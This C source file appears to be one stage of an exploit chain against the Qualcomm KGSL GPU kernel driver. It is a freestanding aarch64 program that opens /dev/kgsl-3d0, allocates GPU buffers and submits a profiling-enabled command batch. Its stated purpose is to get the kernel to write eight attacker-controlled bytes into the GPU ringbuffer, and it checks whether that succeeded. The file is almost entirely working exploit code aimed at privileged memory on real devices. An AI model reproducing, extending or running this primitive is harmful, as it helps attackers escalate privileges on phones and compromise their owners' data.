/*
 * kgsl_profile_submit.c - stage 3d: activate user cmdbatch profiling so the
 * kernel writes our 64-bit profiling-buffer GPU address (8 controlled bytes)
 * into the ringbuffer (_get_alwayson_counter, pre/post IB).
 *
 * Verify: the kernel's profiling instrumentation writes GPU ticks into the
 * profiling buffer -> read back gpu_ticks_submitted/retired from CPU.
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_profile_submit kgsl_profile_submit.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_sched_yield 124
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_drawctxt_create{u32 flags;u32 drawctxt_id;};
#define IOCTL_DRAWCTXT_CREATE IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x13,sizeof(struct kgsl_drawctxt_create))
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_command_object{u64 offset;u64 gpuaddr;u64 size;u32 flags;u32 id;};
struct kgsl_gpu_command{u64 flags;u64 cmdlist;u32 cmdsize;u32 numcmds;u64 objlist;u32 objsize;u32 numobjs;u64 synclist;u32 syncsize;u32 numsyncs;u32 context_id;u32 timestamp;};
#define IOCTL_GPU_COMMAND IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x4A,sizeof(struct kgsl_gpu_command))
#define KGSL_CMDLIST_IB 0x1u
#define KGSL_OBJLIST_MEMOBJ 0x8u
#define KGSL_OBJLIST_PROFILE 0x10u
#define KGSL_CMDBATCH_PROFILING 0x10u
#define CP_MEM_WRITE 0x3du

static u32 parity(u32 v){v^=v>>4;v^=v>>8;v^=v>>12;v^=v>>16;v^=v>>20;v^=v>>24;v^=v>>28;return (0x9669u>>(v&0xf))&1u;}
static u32 pkt7(u32 op,u32 cnt){return 0x70000000u|(cnt&0x3fffu)|(parity(cnt)<<15)|((op&0x7fu)<<16)|(parity(op)<<23);}
static void dc_civac(void*p,u64 len){u64 a=(u64)p&~63ull,b=((u64)p+len+63)&~63ull;for(;a<b;a+=64)asm volatile("dc civac, %0"::"r"(a):"memory");asm volatile("dsb ish":::"memory");}
static long gfd; static u32 gdc; static u32*cmd,*outp,*prof; static u64 cmd_gpu,out_gpu,prof_gpu; static u32 cmdid,outid,profid;
static long alloc_buf(u64 size,u32*id,u64*gpu,u32**cpu){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=size;
    long r=sys3(SYS_ioctl,gfd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    *id=a.id; *gpu=a.gpuaddr; u64 mz=a.mmapsize?a.mmapsize:size;
    s64 m=sys6(SYS_mmap,0,mz,3,1,gfd,(s64)((u64)a.id<<12));
    if(m<=0) return -1;
    *cpu=(u32*)m; return 0;
}
static void _start_inner(void);
void _start(void){ _start_inner(); sys3(SYS_exit,0,0,0); }
static void _start_inner(void){
    out("[*] kgsl_profile_submit\n");
    gfd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    if(gfd<0){out("[!] open fail\n");return;}
    struct kgsl_drawctxt_create d; d.flags=0x1012u; d.drawctxt_id=0; /* prio 1 -> rb0 */
    if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)){out("[!] ctx fail\n");return;}
    gdc=d.drawctxt_id;
    if(alloc_buf(0x1000,&cmdid,&cmd_gpu,&cmd)){out("[!] cmd\n");return;}
    if(alloc_buf(0x1000,&outid,&out_gpu,&outp)){out("[!] out\n");return;}
    if(alloc_buf(0x1000,&profid,&prof_gpu,&prof)){out("[!] prof\n");return;}
    out("[1] cmd=");outhex(cmd_gpu);out(" out=");outhex(out_gpu);out(" prof=");outhex(prof_gpu);out("\n");

    for(int i=0;i<16;i++) ((u64*)prof)[i]=0;   /* 5 x u64 profiling struct + pad */
    outp[0]=0; dc_civac(prof,128); dc_civac(outp,4);

    /* command: marker write */
    u32 k=0;
    cmd[k++]=pkt7(CP_MEM_WRITE,3); cmd[k++]=(u32)out_gpu; cmd[k++]=(u32)(out_gpu>>32); cmd[k++]=0x600D600Du;
    dc_civac(cmd,k*4);

    struct kgsl_command_object co; co.offset=0; co.gpuaddr=cmd_gpu; co.size=k*4; co.flags=KGSL_CMDLIST_IB; co.id=cmdid;
    struct kgsl_command_object po; po.offset=0; po.gpuaddr=prof_gpu; po.size=0x1000; po.flags=KGSL_OBJLIST_MEMOBJ|KGSL_OBJLIST_PROFILE; po.id=profid;
    struct kgsl_gpu_command gc; for(u64 i=0;i<sizeof(gc);i++)((u8*)&gc)[i]=0;
    gc.flags=KGSL_CMDBATCH_PROFILING;
    gc.cmdlist=(u64)&co; gc.cmdsize=sizeof(co); gc.numcmds=1;
    gc.objlist=(u64)&po; gc.objsize=sizeof(po); gc.numobjs=1;
    gc.context_id=gdc; gc.timestamp=70;
    long r=sys3(SYS_ioctl,gfd,IOCTL_GPU_COMMAND,(s64)&gc);
    out("[2] GPU_COMMAND(profiling) ret=");outdec(r);out("\n");

    int ok=0; for(int i=0;i<4000;i++){ dc_civac(outp,4); if(outp[0]==0x600D600Du){ok=1;break;} sys3(SYS_sched_yield,0,0,0); }
    out("[3] command marker -> ");out(ok?"OK\n":"timeout\n");

    dc_civac(prof,128);
    u64 *p=(u64*)prof;
    out("[4] profiling buffer: wall_s=");outhex(p[0]);out(" wall_ns=");outhex(p[1]);out("\n");
    out("    ticks queued=");outhex(p[2]);out(" submitted=");outhex(p[3]);out(" retired=");outhex(p[4]);out("\n");
    if(p[3]||p[4]) out("[5] USER PROFILING ACTIVE -> 8 user-controlled bytes were in the RB\n");
    else out("[5] no ticks written (path not active?)\n");
    out("[*] done\n");
    sys3(SYS_close,gfd,0,0);
}
